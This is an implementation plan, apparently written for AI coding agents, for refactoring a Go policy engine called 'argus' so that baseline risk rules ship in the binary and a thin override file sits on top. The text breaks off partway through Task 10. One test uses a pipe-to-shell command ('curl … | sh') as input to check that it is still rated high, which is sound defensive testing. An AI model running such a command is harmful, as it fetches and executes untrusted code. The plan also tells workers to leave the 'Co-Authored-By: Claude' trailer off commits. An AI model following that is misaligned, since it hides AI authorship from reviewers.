# Binary-Owned Baseline Rules + Thin Override Layer — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking. REQUIRED before each task: read `CLAUDE.md` and invoke the **argus-architect** skill.

**Goal:** Make baseline seed rules binary-owned (reassembled every load, never stored), so a newer binary's rules reach existing installs with no re-`init`; `policy.json` shrinks to a thin `overrides` + user-rules layer.

**Architecture:** A new `Baseline()` (extracted from `Default().Rules`) is the binary-owned seed set. A thin on-disk `File` type carries `overrides` (per-baseline `enabled`/`severity`) + user `rules`. `Load` = read → `Validate` → `normalize` (folds any old inline baseline into overrides, migration M1) → `File.Effective()` (assemble `Baseline()` + overrides + user rules → `Policy`). `classify` is unchanged and stays pure — it receives an already-assembled `Policy` and still applies `Floor()` in its own pass.

**Tech Stack:** Go 1.26, `CGO_ENABLED=0`, stdlib `encoding/json`; `santhosh-tekuri/jsonschema/v6` (already a dep) for schema; no new deps.

## Global Constraints

- Go **1.26**, **`CGO_ENABLED=0` always**, pure-Go deps only.
- **Pure core, dirty shell:** all baseline/override assembly happens in the `policy` load path (dirty); `internal/classify` must not change and must stay pure (no I/O/clock/globals).
- **`high` is a floor:** `overrides` may only reference **baseline** IDs and only set `enabled`/`severity`; they can never touch `Floor()`/`SelfProtectRules()` (applied in their own pass, never in the file). A golden test asserts this.
- **Self-protection stays high:** `SelfProtectRules()` unchanged, binary-owned, un-overridable.
- **No hot-path write:** the file is written only by `init` and web save (off the decision path). `Load` never writes.
- **TDD:** failing test first, table-driven default, golden + evasion where relevant, deterministic. Commit at each green.
- **Commits:** identity `lucasngucii <lucasalehwork@gmail.com>`, conventional commits, **no** `Co-Authored-By: Claude` trailer, one logical change per commit.
- Spec: `docs/superpowers/specs/2026-07-29-binary-owned-baselines-design.md`.

## File Structure

- Create: `internal/policy/file.go` — `Override`, `File`, `File.Effective()`, `normalize`, `LoadFile`, `EffectiveFromBytes`, `DefaultFile`.
- Modify: `internal/policy/defaults.go` — extract `Baseline()`; redefine `Default()`.
- Modify: `internal/policy/validate.go` — `SeedRuleIDs()` from `Baseline()`.
- Modify: `internal/policy/policy.go` — rewire `Load()` through `normalize`+`Effective`.
- Modify: `internal/policy/schema.json` — add `overrides`.
- Modify: `internal/cli/init.go` — `seedPolicy` writes `DefaultFile()`.
- Modify: `internal/cli/doctor.go` — drop `warnMissingSeedRules`, add `warnUnknownOverride`.
- Modify: `internal/web/closeloop.go` — persist thin `File`; `parsePolicy` → `EffectiveFromBytes`.
- Modify: `internal/web/explain.go` — add `srv.loadFile()` helper.
- Create: `internal/web/effective.go` — `GET /api/policy/effective` handler + response types.
- Modify: `internal/web/handlers.go` — route `/api/policy/effective`.
- Modify: `internal/web/static/policy.mjs`, `internal/web/static/style.css` — structured overrides editor.
- Tests alongside each (`*_test.go`).

---

## Stage G-1 — Engine / model

### Task 1: `Override` + `File` types, extract `Baseline()`

**Files:**
- Create: `internal/policy/file.go`
- Modify: `internal/policy/defaults.go`
- Test: `internal/policy/file_test.go`, `internal/policy/defaults_test.go`

**Interfaces:**
- Produces: `func Baseline() []Rule` (the seed rules today in `Default().Rules`); `type Override struct { Enabled *bool; Severity string }`; `type File struct { Version int; Meta map[string]string; Defaults Defaults; Overrides map[string]Override; Rules []Rule }`.

- [ ] **Step 1: Write the failing test.** Add to `internal/policy/defaults_test.go`:

```go
func TestBaselineMatchesSeedSet(t *testing.T) {
	ids := map[string]bool{}
	for _, r := range Baseline() {
		if !r.Enabled || r.AlwaysHigh {
			t.Fatalf("baseline rule %q must be enabled and non-alwaysHigh", r.ID)
		}
		ids[r.ID] = true
	}
	for _, want := range []string{"sudo", "git-danger", "rm-recursive", "mcp-mutating-tool", "mcp-read-sensitive-path"} {
		if !ids[want] {
			t.Errorf("Baseline() missing seed rule %q", want)
		}
	}
	if ids["pipe-to-shell"] {
		t.Error("Baseline() must NOT include floor rules")
	}
}
```

- [ ] **Step 2: Run → FAIL.** `CGO_ENABLED=0 go test ./internal/policy/ -run TestBaselineMatchesSeedSet` (undefined: Baseline).

- [ ] **Step 3: Implement.** In `defaults.go`, rename the body of `Default()`'s rule literal into a new `Baseline()` and have `Default()` call it:

```go
// Baseline returns the binary-owned seed rules — the medium-severity "ask"
// coverage every install gets, reassembled from the binary on every load so a
// newer binary's rules reach existing installs without a re-init. Like Floor(),
// it is never stored in policy.json; the file carries only per-baseline
// overrides (see File) and user rules.
func Baseline() []Rule {
	return []Rule{
		// ... move the exact 13 Rule literals currently in Default().Rules here ...
	}
}

// Default returns the effective policy with no overrides (baseline only) — the
// fail-closed fallback for a missing/unreadable policy.json (gate, web explain).
func Default() Policy {
	return File{Version: 1}.Effective()
}
```

In `file.go` (new), declare the types (Effective added in Task 2):

```go
package policy

// Override is a user tweak to one binary-owned baseline rule. Enabled is a
// *bool so "absent" (use baseline) is distinct from an explicit false;
// Severity "" means "unchanged".
type Override struct {
	Enabled  *bool  `json:"enabled,omitempty"`
	Severity string `json:"severity,omitempty"`
}

// File is the on-disk policy document: a thin layer over Baseline(). It stores
// per-baseline overrides and user-authored rules (allowlist + custom) — never
// the baselines themselves.
type File struct {
	Version   int                 `json:"version"`
	Meta      map[string]string   `json:"meta,omitempty"`
	Defaults  Defaults            `json:"defaults,omitempty"`
	Overrides map[string]Override `json:"overrides,omitempty"`
	Rules     []Rule              `json:"rules"`
}
```

> Note: `Default()` references `File{}.Effective()`, added in Task 2. To keep Task 1 compiling on its own, temporarily implement `Default()` as `return Policy{Version: 1, Rules: Baseline()}` and switch it to `File{Version: 1}.Effective()` in Task 2 (behavior-identical).

- [ ] **Step 4: Run → PASS.** `CGO_ENABLED=0 go test ./internal/policy/` (existing tests still green — `Default().Rules` still equals `Baseline()`).

- [ ] **Step 5: Commit** `refactor(policy): extract Baseline() + add Override/File types`.

---

### Task 2: `File.Effective()`, `DefaultFile()`, redefine `Default()` + `SeedRuleIDs()`

**Files:**
- Modify: `internal/policy/file.go`
- Modify: `internal/policy/defaults.go`, `internal/policy/validate.go`
- Test: `internal/policy/file_test.go`

**Interfaces:**
- Produces: `func (f File) Effective() Policy`; `func DefaultFile() File`; redefined `func Default() Policy`; `func SeedRuleIDs() []string` (from `Baseline()`).

- [ ] **Step 1: Write the failing test.** Add to `internal/policy/file_test.go`:

```go
func TestEffectiveAppliesOverrides(t *testing.T) {
	off := false
	f := File{
		Version:   4,
		Overrides: map[string]Override{"sudo": {Enabled: &off}, "pkg-install-lifecycle": {Severity: "low"}},
		Rules:     []Rule{{ID: "allow-x", Enabled: true, Allow: true, Tool: []string{"Bash"}, Reason: "r"}},
	}
	pol := f.Effective()
	byID := map[string]Rule{}
	for _, r := range pol.Rules {
		byID[r.ID] = r
	}
	if _, ok := byID["sudo"]; ok {
		t.Error("disabled baseline sudo must be omitted")
	}
	if byID["pkg-install-lifecycle"].Severity != "low" {
		t.Errorf("severity override not applied: %q", byID["pkg-install-lifecycle"].Severity)
	}
	if _, ok := byID["allow-x"]; !ok {
		t.Error("user rule must be appended")
	}
	if byID["git-danger"].Severity != "medium" {
		t.Error("un-overridden baseline must keep its default severity")
	}
	if pol.Version != 4 {
		t.Errorf("version not carried: %d", pol.Version)
	}
}

func TestEffectiveUnknownOverrideIsNoop(t *testing.T) {
	f := File{Overrides: map[string]Override{"does-not-exist": {Severity: "high"}}}
	for _, r := range f.Effective().Rules {
		if r.ID == "does-not-exist" {
			t.Fatal("unknown override id must not inject a rule")
		}
	}
}
```

- [ ] **Step 2: Run → FAIL.** `CGO_ENABLED=0 go test ./internal/policy/ -run TestEffective`.

- [ ] **Step 3: Implement.** In `file.go`:

```go
// Effective assembles the policy classify sees: every Baseline() rule with its
// override applied (a disabled one is omitted; a severity override replaces the
// rank), followed by the user rules. Overrides referencing an unknown id are
// ignored. Floor()/SelfProtectRules() are NOT added here — classify applies
// them in its own pass, so no override can ever reach them.
func (f File) Effective() Policy {
	rules := make([]Rule, 0, len(Baseline())+len(f.Rules))
	for _, b := range Baseline() { // b is a copy; mutating b.Severity is safe
		if o, ok := f.Overrides[b.ID]; ok {
			if o.Enabled != nil && !*o.Enabled {
				continue
			}
			if o.Severity != "" {
				b.Severity = o.Severity
			}
		}
		rules = append(rules, b)
	}
	rules = append(rules, f.Rules...)
	return Policy{Version: f.Version, Meta: f.Meta, Defaults: f.Defaults, Rules: rules}
}

// DefaultFile is the thin document a fresh install writes: no overrides, no user
// rules — the full binary baseline applies, and stays current across upgrades.
func DefaultFile() File { return File{Version: 1, Rules: []Rule{}} }
```

In `defaults.go` set `func Default() Policy { return File{Version: 1}.Effective() }`.

In `validate.go` rewrite `SeedRuleIDs` to iterate `Baseline()`:

```go
func SeedRuleIDs() []string {
	base := Baseline()
	ids := make([]string, 0, len(base))
	for _, r := range base {
		ids = append(ids, r.ID)
	}
	return ids
}
```

- [ ] **Step 4: Run → PASS**; then full `CGO_ENABLED=0 go test ./...` (confirm `Default()`-consuming tests in `cli`/`web` still pass; `Default().Rules == Baseline()` still holds. If any test asserted `Default().Meta["seed"]`, update it — the seed marker is dropped).

- [ ] **Step 5: Commit** `feat(policy): File.Effective() assembles baseline+overrides+user rules`.

---

### Task 3: `schema.json` — accept `overrides`

**Files:**
- Modify: `internal/policy/schema.json`
- Test: `internal/policy/validate_test.go`

**Interfaces:**
- Produces: schema that validates both a new thin file (with `overrides`) and an old fat file (baselines inline in `rules`).

- [ ] **Step 1: Write the failing test.** Add to `internal/policy/validate_test.go`:

```go
func TestValidateAcceptsOverrides(t *testing.T) {
	doc := []byte(`{"version":1,"overrides":{"sudo":{"enabled":false},"npm-x":{"severity":"low"}},"rules":[]}`)
	if err := Validate(doc); err != nil {
		t.Fatalf("valid overrides doc rejected: %v", err)
	}
}

func TestValidateRejectsBadOverrideSeverity(t *testing.T) {
	doc := []byte(`{"version":1,"overrides":{"sudo":{"severity":"nope"}},"rules":[]}`)
	if err := Validate(doc); err == nil {
		t.Fatal("override severity outside the enum must be rejected")
	}
}
```

- [ ] **Step 2: Run → FAIL** (bad-severity doc currently validates — `overrides` is an unknown key today, so nothing constrains it).

- [ ] **Step 3: Implement.** In `schema.json`, add under `properties` (sibling of `rules`):

```json
"overrides": {
  "type": "object",
  "additionalProperties": {
    "type": "object",
    "properties": {
      "enabled": { "type": "boolean" },
      "severity": { "type": "string", "enum": ["safe", "low", "medium", "high"] }
    },
    "additionalProperties": false
  }
}
```

Leave `"required": ["version", "rules"]` unchanged (an old fat file still validates).

- [ ] **Step 4: Run → PASS**; `CGO_ENABLED=0 go test ./internal/policy/`. Confirm `Validate(Default()`-marshaled`)` still nil.

- [ ] **Step 5: Commit** `feat(policy): schema accepts overrides (enabled/severity per baseline)`.

---

### Task 4: `normalize`, `LoadFile`, `EffectiveFromBytes`, rewire `Load`

**Files:**
- Modify: `internal/policy/file.go`, `internal/policy/policy.go`
- Test: `internal/policy/file_test.go`, `internal/policy/policy_test.go`

**Interfaces:**
- Produces: `func normalize(b []byte) (File, error)`; `func LoadFile(path string) (File, error)`; `func EffectiveFromBytes(b []byte) (Policy, error)`; rewired `func Load(path string) (Policy, error)`.
- Consumes: `Baseline()`, `File.Effective()`, `Validate` (Task 2–3).

- [ ] **Step 1: Write the failing tests.** Add to `internal/policy/file_test.go`:

```go
func TestNormalizeFoldsOldInlineBaselines(t *testing.T) {
	// An old fat file: sudo disabled, git-danger severity-edited, a stock
	// rm-recursive copy, and a user allowlist rule.
	old := []byte(`{"version":2,"rules":[
	  {"id":"sudo","enabled":false,"tool":["Bash"],"reason":"sudo","match":{"cmd":["sudo"]}},
	  {"id":"git-danger","enabled":true,"severity":"high","tool":["Bash"],"reason":"g","match":{"cmd":["git"],"targetScorer":"git_danger"}},
	  {"id":"rm-recursive","enabled":true,"severity":"medium","tool":["Bash"],"reason":"rm -r directory","match":{"cmd":["rm"],"flags":["r"],"targetScorer":"rm_target"}},
	  {"id":"allow-abc","enabled":true,"allow":true,"tool":["Bash"],"reason":"x","match":{"raw":"^echo hi$"}}
	]}`)
	f, err := normalize(old)
	if err != nil {
		t.Fatal(err)
	}
	if f.Overrides["sudo"].Enabled == nil || *f.Overrides["sudo"].Enabled {
		t.Error("disabled sudo must become an enabled:false override")
	}
	if f.Overrides["git-danger"].Severity != "high" {
		t.Errorf("edited git-danger severity must become an override, got %q", f.Overrides["git-danger"].Severity)
	}
	if _, ok := f.Overrides["rm-recursive"]; ok {
		t.Error("a stock baseline copy must be dropped, not overridden")
	}
	if len(f.Rules) != 1 || f.Rules[0].ID != "allow-abc" {
		t.Errorf("user allowlist rule must be kept, got %+v", f.Rules)
	}
}

func TestNormalizeThinRoundTrips(t *testing.T) {
	thin := []byte(`{"version":1,"overrides":{"sudo":{"enabled":false}},"rules":[]}`)
	f, err := normalize(thin)
	if err != nil {
		t.Fatal(err)
	}
	if f.Overrides["sudo"].Enabled == nil || *f.Overrides["sudo"].Enabled {
		t.Error("explicit override must survive normalize")
	}
	if len(f.Rules) != 0 {
		t.Errorf("no user rules expected, got %d", len(f.Rules))
	}
}
```

Add to `internal/policy/policy_test.go`:

```go
func TestLoadOldFileGivesCurrentBaseline(t *testing.T) {
	dir := t.TempDir()
	path := dir + "/policy.json"
	// A minimal old file with NO mcp-mutating-tool inline (a stale install).
	if err := os.WriteFile(path, []byte(`{"version":2,"rules":[
	  {"id":"sudo","enabled":true,"severity":"medium","tool":["Bash"],"reason":"sudo","match":{"cmd":["sudo"]}}
	]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	pol, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]bool{}
	for _, r := range pol.Rules {
		got[r.ID] = true
	}
	if !got["mcp-mutating-tool"] {
		t.Error("a stale old file must still get the current binary baseline (mcp-mutating-tool)")
	}
}
```

- [ ] **Step 2: Run → FAIL.** `CGO_ENABLED=0 go test ./internal/policy/ -run 'TestNormalize|TestLoadOld'`.

- [ ] **Step 3: Implement.** In `file.go`:

```go
// normalize converts any historically-valid policy document into a canonical
// File. An inline rule whose id is a Baseline() id is an old-format copy: an
// edit (disabled, or a differing severity) becomes an override; an identical
// stock copy is dropped (the binary owns it now). Every other rule (allowlist /
// custom) is kept. It is total and pure — the single migration authority shared
// by Load, LoadFile, and the web save path. (M1 in the design spec.)
func normalize(b []byte) (File, error) {
	var raw File
	if err := json.Unmarshal(b, &raw); err != nil {
		return File{}, fmt.Errorf("decode policy: %w", err)
	}
	base := map[string]Rule{}
	for _, r := range Baseline() {
		base[r.ID] = r
	}
	out := File{Version: raw.Version, Meta: raw.Meta, Defaults: raw.Defaults, Overrides: map[string]Override{}, Rules: []Rule{}}
	for id, o := range raw.Overrides {
		out.Overrides[id] = o
	}
	for _, r := range raw.Rules {
		b0, isBaseline := base[r.ID]
		if !isBaseline {
			out.Rules = append(out.Rules, r)
			continue
		}
		ov := out.Overrides[r.ID]
		if !r.Enabled {
			off := false
			ov.Enabled = &off
		}
		if r.Severity != "" && r.Severity != b0.Severity {
			ov.Severity = r.Severity
		}
		if ov.Enabled != nil || ov.Severity != "" {
			out.Overrides[r.ID] = ov
		}
	}
	return out, nil
}

// LoadFile reads, validates, and normalizes the on-disk document to its thin
// canonical File — for callers that edit or re-serialize the file (web editor,
// close-the-loop allowlist), which must NOT round-trip through Effective() or
// they would write the baselines back into the file.
func LoadFile(path string) (File, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		return File{}, fmt.Errorf("load policy: %w", err)
	}
	if err := Validate(b); err != nil {
		return File{}, fmt.Errorf("load policy %s: %w", path, err)
	}
	return normalize(b)
}

// EffectiveFromBytes validates + normalizes + assembles a policy document held
// in memory (a candidate upload, a stored snapshot) into the Policy classify
// consumes — so an old-format candidate re-scores against the CURRENT binary
// baseline. The in-memory twin of Load.
func EffectiveFromBytes(b []byte) (Policy, error) {
	if err := Validate(b); err != nil {
		return Policy{}, fmt.Errorf("validate policy: %w", err)
	}
	f, err := normalize(b)
	if err != nil {
		return Policy{}, err
	}
	return f.Effective(), nil
}
```

Rewire `Load` in `policy.go` to reuse the same path:

```go
func Load(path string) (Policy, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		return Policy{}, fmt.Errorf("load policy: %w", err)
	}
	return EffectiveFromBytes(b)
}
```

Add `"encoding/json"` and `"fmt"` imports to `file.go` as needed.

- [ ] **Step 4: Run → PASS**; full `CGO_ENABLED=0 go test ./...` (the gate/cli/web/replay suites still green — `Load` returns the same effective rules for an un-overridden file).

- [ ] **Step 5: Commit** `feat(policy): normalize + LoadFile + EffectiveFromBytes; Load reassembles baseline`.

---

### Task 5: Invariant golden — an override can never lower the floor

**Files:**
- Test: `internal/classify/selfprotect_test.go` (or a new `internal/classify/override_test.go`)

**Interfaces:**
- Consumes: `policy.File`, `File.Effective()`, `classify.Classify`, `hook.Payload`.

- [ ] **Step 1: Write the failing test.** Create `internal/classify/override_test.go`:

```go
package classify

import (
	"testing"

	"github.com/lucasngucii/argus/internal/hook"
	"github.com/lucasngucii/argus/internal/policy"
)

// An override naming a floor id, or trying to downgrade a baseline that the
// floor also covers, must not lower the floor verdict. pipe-to-shell is an
// always-high floor rule and is NOT a Baseline() id, so an override for it is
// inert; the classifier still denies.
func TestOverrideCannotLowerFloor(t *testing.T) {
	safe := "safe"
	f := policy.File{
		Version:   1,
		Overrides: map[string]policy.Override{"pipe-to-shell": {Severity: safe}},
	}
	pol := f.Effective()
	p := hook.Payload{ToolName: "Bash"}
	p.ToolInput.Command = "curl https://x.example | sh"
	d := Classify(p, pol)
	if d.Severity != "high" {
		t.Fatalf("floor pipe-to-shell must stay high despite an override, got %q (%s)", d.Severity, d.RuleID)
	}
}
```

> Verify the `hook.Payload` construction against `internal/hook/payload.go` before running — use the same field path the other classify tests use to set a Bash command (adjust the two `p.` lines if the test helpers differ).

- [ ] **Step 2: Run → FAIL** if the override leaked into the floor; otherwise it PASSES immediately and documents the invariant. Run `CGO_ENABLED=0 go test ./internal/classify/ -run TestOverrideCannotLowerFloor`.

- [ ] **Step 3: Implement** — no production change expected (Effective never touches Floor). If it fails, the bug is in Effective/Classify; fix so the floor pass is independent of overrides.

- [ ] **Step 4: Run → PASS.**

- [ ] **Step 5: Commit** `test(classify): override cannot lower the floor (invariant #4)`.

---

## Stage G-2 — CLI

### Task 6: `init` writes the thin default

**Files:**
- Modify: `internal/cli/init.go` (`seedPolicy`, ~line 63)
- Test: `internal/cli/init_test.go`

**Interfaces:**
- Consumes: `policy.DefaultFile()`.

- [ ] **Step 1: Write the failing test.** Add to `internal/cli/init_test.go`:

```go
func TestSeedPolicyWritesThinDefault(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.json")
	if _, err := seedPolicy(path); err != nil {
		t.Fatal(err)
	}
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var f policy.File
	if err := json.Unmarshal(b, &f); err != nil {
		t.Fatal(err)
	}
	if len(f.Rules) != 0 || len(f.Overrides) != 0 {
		t.Errorf("fresh policy must be thin (no rules, no overrides), got %+v", f)
	}
	// And the effective policy from it still carries the full baseline.
	pol, err := policy.Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(pol.Rules) < len(policy.Baseline()) {
		t.Error("thin default must still yield the full baseline effective policy")
	}
}
```

- [ ] **Step 2: Run → FAIL** (seedPolicy still marshals `policy.Default()` → fat file with baselines).

- [ ] **Step 3: Implement.** In `init.go`, change the marshal in `seedPolicy` from `policy.Default()` to `policy.DefaultFile()`:

```go
	b, err := json.MarshalIndent(policy.DefaultFile(), "", "  ")
	if err != nil {
		return nil, fmt.Errorf("init: marshal default policy: %w", err)
	}
```

- [ ] **Step 4: Run → PASS**; full `CGO_ENABLED=0 go test ./internal/cli/`.

- [ ] **Step 5: Commit** `feat(cli): init seeds the thin policy (baselines come from the binary)`.

---

### Task 7: `doctor` — drop missing-baseline WARN, add unknown-override WARN

**Files:**
- Modify: `internal/cli/doctor.go` (replace `warnMissingSeedRules`)
- Test: `internal/cli/doctor_test.go`

**Interfaces:**
- Consumes: `policy.LoadFile`, `policy.SeedRuleIDs`.

- [ ] **Step 1: Write the failing test.** Add to `internal/cli/doctor_test.go`:

```go
func TestDoctorWarnsUnknownOverride(t *testing.T) {
	home := t.TempDir()
	argus := filepath.Join(home, ".argus")
	if err := os.MkdirAll(argus, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(argus, "policy.json"),
		[]byte(`{"version":1,"overrides":{"ghost-rule":{"enabled":false}},"rules":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	var b strings.Builder
	warnUnknownOverride(home, &b)
	if !strings.Contains(b.String(), "ghost-rule") {
		t.Errorf("expected WARN about unknown override id, got %q", b.String())
	}
}

func TestDoctorNoWarnOnCleanThinPolicy(t *testing.T) {
	home := t.TempDir()
	argus := filepath.Join(home, ".argus")
	if err := os.MkdirAll(argus, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(argus, "policy.json"),
		[]byte(`{"version":1,"overrides":{"sudo":{"enabled":false}},"rules":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	var b strings.Builder
	warnUnknownOverride(home, &b)
	if b.Len() != 0 {
		t.Errorf("clean policy must not warn, got %q", b.String())
	}
}
```

Delete any existing `TestDoctor*MissingSeedRules` test in this file.

- [ ] **Step 2: Run → FAIL** (undefined `warnUnknownOverride`).

- [ ] **Step 3: Implement.** In `doctor.go`, remove `warnMissingSeedRules` and its call site; add:

```go
// warnUnknownOverride prints a non-fatal WARN for any override that names a
// rule id no current Baseline() carries — a stale override left after a rule was
// renamed or removed. Baselines can no longer be "missing" (they come from the
// binary), so this is the correctly-oriented drift check. Does NOT change exit.
func warnUnknownOverride(home string, w io.Writer) {
	f, err := policy.LoadFile(filepath.Join(home, ".argus", "policy.json"))
	if err != nil {
		return
	}
	known := map[string]bool{}
	for _, id := range policy.SeedRuleIDs() {
		known[id] = true
	}
	var unknown []string
	for id := range f.Overrides {
		if !known[id] {
			unknown = append(unknown, id)
		}
	}
	sort.Strings(unknown) // deterministic output
	if len(unknown) > 0 {
		fmt.Fprintf(w, "WARN policy: override references unknown baseline rule: %s\n", strings.Join(unknown, ", "))
	}
}
```

Update the caller (where `warnMissingSeedRules` was invoked) to call `warnUnknownOverride`. Add `"sort"` to imports.

- [ ] **Step 4: Run → PASS**; full `CGO_ENABLED=0 go test ./internal/cli/`.

- [ ] **Step 5: Commit** `feat(cli): doctor warns on stale overrides, not missing baselines`.

---

## Stage G-3 — Web control-plane (W2)

### Task 8: Web persist writes the thin File; replay candidate normalizes

**Files:**
- Modify: `internal/web/closeloop.go` (allowlist handler ~line 101, `parsePolicy` ~line 157)
- Modify: `internal/web/explain.go` (add `loadFile` helper)
- Test: `internal/web/closeloop_test.go`

**Interfaces:**
- Consumes: `policy.LoadFile`, `policy.EffectiveFromBytes`, `policy.DefaultFile`.
- Produces: `func (srv *Server) loadFile() policy.File`.

- [ ] **Step 1: Write the failing test.** Add to `internal/web/closeloop_test.go` (follow the existing test's server-construction helper in that file):

```go
func TestAllowlistPersistsThinFile(t *testing.T) {
	srv, dir := newTestServer(t) // reuse this file's existing helper; adapt name if different
	body := `{"tool":"Bash","command":"echo hi"}`
	req := httptest.NewRequest(http.MethodPost, "/api/allowlist", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Argus-CSRF", "1")
	req.Host = "127.0.0.1:4600"
	rec := httptest.NewRecorder()
	srv.Handler().ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("allowlist POST: %d %s", rec.Code, rec.Body.String())
	}
	written, err := os.ReadFile(filepath.Join(dir, "policy.json"))
	if err != nil {
		t.Fatal(err)
	}
	var f policy.File
	if err := json.Unmarshal(written, &f); err != nil {
		t.Fatal(err)
	}
	for _, r := range f.Rules {
		if r.ID == "sudo" || r.ID == "git-danger" {
			t.Fatalf("baseline %q must NOT be written back into the file", r.ID)
		}
	}
	if len(f.Rules) != 1 || !f.Rules[0].Allow {
		t.Errorf("expected exactly the new allow rule, got %+v", f.Rules)
	}
}
```

- [ ] **Step 2: Run → FAIL** (today the handler marshals the effective policy → baselines land in the file).

- [ ] **Step 3: Implement.**

In `explain.go`, add a thin-file loader beside `loadPolicy`:

```go
// loadFile returns the current thin policy File (overrides + user rules) for the
// endpoints that re-serialize the document — never the effective Policy, which
// would write the baselines back into the file. A missing file yields the thin
// default.
func (srv *Server) loadFile() policy.File {
	f, err := policy.LoadFile(srv.policyPath)
	if err != nil {
		return policy.DefaultFile()
	}
	return f
}
```

In `closeloop.go`, rewrite the allowlist handler body (the `pol := srv.loadPolicy(); pol.Rules = append(...)` block) to operate on the File:

```go
	f := srv.loadFile()
	f.Rules = append(f.Rules, allowRule(req))

	body, err := json.Marshal(f)
	if err != nil {
		serverError(w, "marshal policy", err)
		return
	}
	if err := policy.Validate(body); err != nil {
		badRequest(w, "resulting policy invalid", err)
		return
	}
	next, err := srv.persistPolicy(body, allowlistNote(req))
```

Change `parsePolicy` to assemble via the shared path so an old-format candidate re-scores against the current baseline:

```go
func parsePolicy(body []byte) (policy.Policy, error) {
	return policy.EffectiveFromBytes(body)
}
```

- [ ] **Step 4: Run → PASS**; full `CGO_ENABLED=0 go test ./internal/web/`.

- [ ] **Step 5: Commit** `fix(web): allowlist + replay candidate operate on the thin policy file`.

---

### Task 9: `GET /api/policy/effective`

**Files:**
- Create: `internal/web/effective.go`
- Modify: `internal/web/handlers.go` (route registration)
- Test: `internal/web/effective_test.go`

**Interfaces:**
- Consumes: `policy.Baseline()`, `srv.loadFile()`.
- Produces: `GET /api/policy/effective` → `{ baselines: [...], userRules: [...] }`.

- [ ] **Step 1: Write the failing test.** Create `internal/web/effective_test.go`:

```go
func TestEffectiveEndpointShape(t *testing.T) {
	srv, dir := newTestServer(t)
	if err := os.WriteFile(filepath.Join(dir, "policy.json"),
		[]byte(`{"version":1,"overrides":{"sudo":{"enabled":false}},"rules":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest(http.MethodGet, "/api/policy/effective", nil)
	req.Host = "127.0.0.1:4600"
	rec := httptest.NewRecorder()
	srv.Handler().ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("effective GET: %d", rec.Code)
	}
	var resp struct {
		Baselines []struct {
			ID              string `json:"id"`
			DefaultSeverity string `json:"defaultSeverity"`
			Override        *struct {
				Enabled  *bool  `json:"enabled"`
				Severity string `json:"severity"`
			} `json:"override"`
		} `json:"baselines"`
	}
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatal(err)
	}
	var sudo *bool
	for _, b := range resp.Baselines {
		if b.ID == "sudo" {
			if b.Override == nil {
				t.Fatal("sudo should report its override")
			}
			sudo = b.Override.Enabled
		}
	}
	if sudo == nil || *sudo {
		t.Error("sudo override enabled:false must be reflected")
	}
}
```

- [ ] **Step 2: Run → FAIL** (404 — no route).

- [ ] **Step 3: Implement.** Create `effective.go`:

```go
package web

import "net/http"

type baselineView struct {
	ID              string   `json:"id"`
	Reason          string   `json:"reason"`
	Tool            []string `json:"tool"`
	DefaultSeverity string   `json:"defaultSeverity"`
	Override        *overrideView `json:"override"`
}

type overrideView struct {
	Enabled  *bool  `json:"enabled"`
	Severity string `json:"severity"`
}

type effectiveResponse struct {
	Baselines []baselineView `json:"baselines"`
	UserRules []policyRuleAny `json:"userRules"`
}

// handleEffective serves GET /api/policy/effective: every binary baseline with
// its current override state, plus the user rules — the data the structured
// policy editor renders.
func (srv *Server) handleEffective(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		methodNotAllowed(w)
		return
	}
	f := srv.loadFile()
	base := policyBaselines() // helper returning policy.Baseline()
	views := make([]baselineView, 0, len(base))
	for _, b := range base {
		bv := baselineView{ID: b.ID, Reason: b.Reason, Tool: b.Tool, DefaultSeverity: b.Severity}
		if o, ok := f.Overrides[b.ID]; ok {
			bv.Override = &overrideView{Enabled: o.Enabled, Severity: o.Severity}
		}
		views = append(views, bv)
	}
	writeJSON(w, http.StatusOK, effectiveResponse{Baselines: views, UserRules: toRuleAny(f.Rules)})
}
```

> Implementation notes for the engineer: (a) `policyBaselines()` is a one-line wrapper over `policy.Baseline()` — inline it if you prefer. (b) `policyRuleAny`/`toRuleAny` just serialize `[]policy.Rule` to JSON; if the codebase already marshals `policy.Rule` directly (it does — `Rule` has json tags), drop the wrapper and use `[]policy.Rule` for `UserRules`. Prefer the simplest form that compiles.

Register the route in `handlers.go` next to the existing `/api/policy` registration:

```go
	mux.HandleFunc("/api/policy/effective", srv.handleEffective)
```

> Route-ordering note: `/api/policy/versions/` is matched by a prefix handler today. Ensure `/api/policy/effective` is registered as its own exact pattern and does not collide with the `/api/policy/versions/` prefix or the `/api/policy` handler — verify against `handlers.go`'s existing mux pattern style (exact vs prefix) and mirror it.

- [ ] **Step 4: Run → PASS**; full `CGO_ENABLED=0 go test ./internal/web/`.

- [ ] **Step 5: Commit** `feat(web): GET /api/policy/effective — baselines + override state`.

---

### Task 10: Structured overrides editor (`policy.mjs` + `style.css`)

**Files:**
- Modify: `internal/web/static/policy.mjs`
- Modify: `internal/web/static/style.css`
- Verify: `argus serve` in a scratch `~/.argus`, exercised in a browser.

**Interfaces:**
- Consumes: `GET /api/policy/effective`, `PUT /api/policy` (thin File body), `GET /api/policy` (versions).

- [ ] **Step 1: Rebuild the Policy panel.** Replace `policy.mjs`'s textarea-centric `mount`/`load` with a structured view. Fetch `/api/policy/effective`; render:
